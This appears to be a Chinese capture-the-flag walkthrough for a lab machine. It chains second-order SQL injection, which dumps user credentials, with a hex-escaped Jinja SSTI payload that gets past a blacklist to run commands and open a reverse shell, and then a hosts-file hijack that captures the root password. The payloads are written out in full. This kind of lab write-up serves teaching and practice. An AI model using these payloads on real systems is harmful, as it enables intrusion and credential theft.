# Second

排名第二并不是一件坏事，但在这种情况下并非如此。

---

## 端口扫描

循例nmap

![在这里插入图片描述](https://img-blog.csdnimg.cn/eff3c3c0ebb3495180de8f7bf563a597.png)

## Web枚举

进到8000

![在这里插入图片描述](https://img-blog.csdnimg.cn/20e837381d3a456abd7a050de82a6d03.png)

注册个账号进去，没啥用

### 二次注入

虽然登录框那里没有sql注入，但是可以尝试注册个非法账户名尝试二次注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/ffdeaa56255b49dd8c65f6c5ac943a96.png)

登录进去之后使用单词计数器

![在这里插入图片描述](https://img-blog.csdnimg.cn/ecfae8f6adc14a8c8bfc96f5eb08ad47.png)

说明sql语句被执行了

直接利用，注册，这里爆出来回显点是2

	' union select 1,2,3,4#-- -

![在这里插入图片描述](https://img-blog.csdnimg.cn/c26881b3ad6c4b1b9f8a857234a24bbb.png)

接下来就是通过information_schema爆表爆字段

	' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='website'#-- -
	' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#-- -
	' union select 1,group_concat(username,'||',password),3,4 from users#-- -

获得smokey的凭据

![在这里插入图片描述](https://img-blog.csdnimg.cn/afbd79150afe44f7af1b699fe2d376d7.png)

它可以登ssh

## 横向移动

在/opt/app下有一个flask

![在这里插入图片描述](https://img-blog.csdnimg.cn/04e2f80381e34b6dba428136b6081dc9.png)

查看app.py看到服务开在5000端口，先转发出来

![在这里插入图片描述](https://img-blog.csdnimg.cn/ae3e6d45d47b42ecad1b8d9acd51b6e6.png)

也是一样的登录框

查看源码发现它是直接把username插入页面，这意味着可以尝试SSTI

![在这里插入图片描述](https://img-blog.csdnimg.cn/dd50530dc6a54b21a7289a6039a333f1.png)

注册一个{{1+1}}的用户名，登录得到了结果

![在这里插入图片描述](https://img-blog.csdnimg.cn/001b43d03aac4e779b6886bf3c415283.png)

虽然它有黑名单，但我们可以通过十六进制字符轻松绕过

![在这里插入图片描述](https://img-blog.csdnimg.cn/5bc03635f9214c0d81ed76079a21cb8e.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/7142686d4a1e4559a3b802dc5899b71a.png)

payload:

	{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

![在这里插入图片描述](https://img-blog.csdnimg.cn/7125732ced884e23b756955bc8f2cbc0.png)

没问题，直接reverse shell

![在这里插入图片描述](https://img-blog.csdnimg.cn/01a18df2c6944762b3bf160e45a49ca3.png)

	{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('/tmp/cmd')|attr('read')()}}

![在这里插入图片描述](https://img-blog.csdnimg.cn/1ec646bbfa8e41699e0911c076d95dd1.png)

成功过来，同时拿到user flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/d46b5d881a5c4af18b63327ccc98c85e.png)

## 权限提升

note.txt

	请尽快完成第二个项目现场。 确保 WAF 确实阻止了所有攻击，并且您使用正确的渲染模板来避免 SSTI。 你真的应该让你的网站像我的字计数器一样安全。
	
	另外，我需要你在那个 PHP 站点上打气，我将登录以检查你的进度。

在/var/www下有个dev_site

![在这里插入图片描述](https://img-blog.csdnimg.cn/d6f1bbb95f8e49f48805364f2e6b88aa.png)

传个pspy过去，发现有个定时任务

![在这里插入图片描述](https://img-blog.csdnimg.cn/dbddf9c87ba94a17bcff41eb0ebd6416.png)

联系上面的note，那么smokey会定时带着凭据登录过去，但dev_site我们并没有权限修改

hosts有acl

![在这里插入图片描述](https://img-blog.csdnimg.cn/29bc8ae3344546ceb0ef629e0ec4a456.png)

查看acl发现hazel有写入权限

![在这里插入图片描述](https://img-blog.csdnimg.cn/10b55a9cc6484a62a12cbaa9d57cd306.png)

hosts里有那个域名，那么如果脚本通过域名请求，那么我们将可以直接修改hosts指向我们的攻击机

![在这里插入图片描述](https://img-blog.csdnimg.cn/2f9187ba11d44fd791b7ed789f80fab7.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/2f03144551324bb092ecebc2102eade9.png)

覆盖过去

![在这里插入图片描述](https://img-blog.csdnimg.cn/8aae7e6799e243faad7fe44efeac5c1d.png)

内网还有一个8080端口，那个应该就是dev_site的了

本地端口转发直接转过来

![在这里插入图片描述](https://img-blog.csdnimg.cn/8d3db114a54647268ad2adf20999f212.png)

wireshark抓包，得到凭据

![在这里插入图片描述](https://img-blog.csdnimg.cn/30a4edbdc149414abc0564ca3006b813.png)

这是root的密码，直接su过去

![在这里插入图片描述](https://img-blog.csdnimg.cn/d7a544ef3019489f8bd6297f9433669e.png)

getroot
